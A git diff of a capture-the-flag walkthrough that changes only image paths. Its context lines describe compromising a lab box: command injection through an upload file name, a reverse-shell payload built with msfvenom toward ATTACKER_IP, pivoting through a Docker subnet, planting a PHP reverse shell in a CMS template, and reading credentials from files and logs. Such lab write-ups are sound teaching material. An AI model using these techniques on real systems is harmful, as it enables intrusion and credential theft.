@@ -61,13 +61,13 @@ Looks to be a linux machine with a channel open for rpc. There are just four por
 
 Checking out the landing page on port 80 shows that the website's purpose us to upload things on their FTP server for safekeeping. There's also a username of 4ndr34z (box creator) we may use.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/1.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/1.png)
 
 This is interesting as we can not read FTP directly, but this upload API allows us to communicate with it. I'm guessing an administrator will be checking these scripts which will auto-execute them for our sake.
 
 Something pretty cool happens whenever scanning for subdirectories with gobuster/dirsearch. I kept getting 200 OK responses from the server, so I thought it was a custom 404 page. Looking at different endpoints that didn't exist showed a script was running to display unique quotes on the screen, and in turn making it very hard to fuzz for real directories as we can't filter by page size or response code.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/2.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/2.png)
 
 This is a pretty fool-proof way to block any attempts at fuzzing endpoints on a server. However we aren't fools and Ffuf allows for filtering regular expressions by supplying the `-fr` flag, this is what I use:
 
@@ -117,23 +117,23 @@ statichtml              [Status: 404, Size: 169, Words: 6, Lines: 8, Duration: 5
 
 This doesn't return much but we can be sure that the upload API is the correct route to take now. Also interestingly, using a known page that responds with a 403 Forbidden in any part of the fuzzing string will return an actual 404 Not Found page (ie. static and staticpages).
 
-![](../assets/img/2026-01-27-TempusFugitDurius/3.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/3.png)
 
-![](../assets/img/2026-01-27-TempusFugitDurius/4.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/4.png)
 
 I capture a request while uploading a test script and find that the server only allows for `.txt` and `.rtf` files.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/5.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/5.png)
 
 I was curious about the cookie being set once uploaded so I unsigned it using flask-unsign and found out it was the reason for this popup.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/6.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/6.png)
 
 I tried changing the extension of my uploaded script from `.txt` to many malicious ones like `.txt.php` and altering it mid request to be `.sh`, however neither one worked. I did find it interesting that `.rtf` files were allowed on the server, because these allow for OLE embedded objects in some cases and can potentially lead to RCE.
 
 Before getting around to that, I found that while intercepting a file upload, we could append a command after our specified file name to get command execution via the web server.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/7.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/7.png)
 
 Let's change this command to a simple reverse shell pointed at our attacking machine. This confirms the server is running on Flask/Python as well.
 
@@ -150,17 +150,17 @@ I begin with some manual enumeration on any writable files for our current user 
 
 There is also a `start.sh` script which denotes that if there is a prestart.sh script in /app, it will run it before carrying on. This script is used to start a hypersvisor using nginx and a uWSGI (serves as a web server gateway interface for Python application).
 
-![](../assets/img/2026-01-27-TempusFugitDurius/8.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/8.png)
 
-![](../assets/img/2026-01-27-TempusFugitDurius/9.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/9.png)
 
 There is nothing too crazy about the hypervisor script so I head over to /app and start checking files in there. Inside prestart.sh is a simple script that will perform migrations if needed for the hypervisor.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/10.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/10.png)
 
 I also take a look inside main.py for any hardcoded creds and to my luck, I find an FTP login for 'someuser' at `ftp.mofo.pwn`.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/11.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/11.png)
 
 ## FTP Creds
 Attempting to access the FPT server shows that the tool isn't installed on the box, however we can either port forward this with netcat or write a simple Python script to sign in, keeping to the theme.
@@ -175,7 +175,7 @@ ftp.login('someuser','[REDACTED]')
 ftp.retrlines('LIST')
 ```
 
-![](../assets/img/2026-01-27-TempusFugitDurius/12.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/12.png)
 
 There is a creds.txt file, that was not uploaded by me. Hopefully this will contain some juicy SSH credentials for us. To retrieve this, I update my script to contain some lines to write the file as bytes and put it on our current dir:
 
@@ -194,11 +194,11 @@ with open ('creds.txt', 'wb') as fp:
 
 After executing that, I find a pair of creds for an admin.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/13.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/13.png)
 
 These are most likely used for the Docker container and not root's password so let's begin enumerating where we are. Ifconfig shows us another host located at `192.168.150.10`.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/14.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/14.png)
 
 ## Subnet Enumeration
 In order to escape our current container and access the host on that interface, we'll need to port forward it to our machine. I use nc for this part as we actually have access to it, however if you're in something like a Meterpreter shell, that makes it a bit easier.
@@ -217,15 +217,15 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o s
 
 First, I autoroute the subnet using `/post/multi/manage/autoroute` while setting the subnet to `192.168.150.0` and the session to our one up on the Docker container.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/15.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/15.png)
 
 Then, I set up a proxy chain using the `/auxiliary/server/socks_proxy` module to be able to run Nmap against that subnet and find out more info.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/16.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/16.png)
 
 Firing up Nmap will take a very long time to go through all of the hosts, so I enumerate the most common ports first. Doing so actually lists all the ports being filtered and the broadcast being closed, so I know it's working but the packet is probably being dropped by a firewall or something.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/17.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/17.png)
 
 To work around this, I use a bash for loop to cycle through the entire subnet on port 80 and have it print any hosts that don't discard our TCP packets.
 
@@ -236,7 +236,7 @@ for i in {1..254}; do
 done
 ```
 
-![](../assets/img/2026-01-27-TempusFugitDurius/18.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/18.png)
 
 We can see that port 80 on both `192.168.150.1` and `192.168.150.10` are open. We can skip the second one as we already forwarded that and found nothing on the webpage. I port forward that webpage using meterpreter again and have a look.
 
@@ -246,37 +246,37 @@ portfwd add -l 4567 -p 80 -r 192.168.150.1
 
 Hey we actually find something else, good to know this isn't a rabbit hole after all.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/19.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/19.png)
 
 Now we can find some directories using gobuster. Make sure to set the timing to lowest as our proxies can get overwhelmed and the queries will be timed out if not.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/20.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/20.png)
 
 The `/admin` dir looks interesting especially because we have credentials for an administrator, but it gets stuck loading. I end up doing a dig on the compromised machine to find any other alternate names. Since ftp.mofo.pwn had its own subdomain, I figured that an admin panel would have one too.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/21.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/21.png)
 
 ## DNS records
 Looking at the DNS zone transfer contents displays two other subdomains with CNAME records. I doubt `www` has one because it is exposed to the web and we already enumerated ftp, so let's check out `newcms.mofo.pwn`.
 
 I add those domains to my /etc/hosts file and continue on. I navigate to /admin and find a login panel at last. Using the credentials found while enumerating FTP grants us a successful logon and we can have a look around.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/22.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/22.png)
 
 Looks like your run of the mill CMS and we already have access to the settings tab which will let us change a theme's source code. To get a reverse shell on this host, I use Pentestmonkey's PHP reverse shell and replace the blog.html template with our malicious code.
 
 After setting up a netcat listener, we have a shell as `www-data` yet again except we're on the correct system.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/23.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/23.png)
 
 ## Privilege Escalation
 Let's begin looking at routes for privilege escalation. I check for the typical SUID bits set, loose sudo privs, and backups laying around in /var, but find nothing of importance. Checking the html data for the website gives us a few database files to play around with.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/24.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/24.png)
 
 We can dump the contents of database.sdb (not the first one because its size is 0) by transfering it to our attacking machine with something like netcat. I use sqlite3 here and select all from the users table.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/25.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/25.png)
 
 Ok, we get two hashes for users Ben Clover and Hugh Gant. Let's send them over to JohnTheRipper or Hashcat to try and crack them for a plaintext password.
 
@@ -292,15 +292,15 @@ Again, I manually enumerate the box looking for special permissions on any files
 
 This binary is typically just a spell checker, but our friends over at GTFOBins have a great method to spawn a shell from it and read files using those higher privileges. 
 
-![](../assets/img/2026-01-27-TempusFugitDurius/26.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/26.png)
 
 Doing so won't let us read root.txt directly, so I fallback to the auth.log file and find a line with potential creds for root user. It seems like the system prompted a sign in on SSH and the user accidentally supplied their password instead of a username.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/27.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/27.png)
 
 Switching users will grant us root access on the box and we can grab that final flag at `/root/flag2.txt`.
 
-![](../assets/img/2026-01-27-TempusFugitDurius/28.png)
+![](/assets/img/2026-01-27-TempusFugitDurius/28.png)
 
 That's all folks; this box itself was pretty fun as a whole but I had heaps of problems getting a solid connection while port forwarding and had to reset the machine more than once. Either way I really liked the concept of enumerating the subdomain to find another host. 
 
